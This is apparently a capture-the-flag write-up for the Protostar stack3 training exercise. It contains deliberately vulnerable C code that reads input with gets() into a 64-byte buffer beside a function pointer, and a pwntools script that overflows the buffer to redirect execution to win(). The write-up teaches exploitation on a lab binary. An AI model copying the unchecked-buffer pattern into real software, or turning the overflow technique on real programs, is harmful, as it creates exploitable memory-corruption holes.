## Challenge Description

Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

Hints

- both gdb and objdump is your friend you determining where the win() function lies in memory.

This level is at /opt/protostar/bin/stack3

## Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

## Solution

```python
from pwn import *

target = process("./stack3")
elf = context.binary = ELF("./stack3", checksec = False)
context.log_level = "debug"

win = elf.sym.win

payload = b"0"*64 + p32(win)

target.sendline(payload)
target.interactive()
```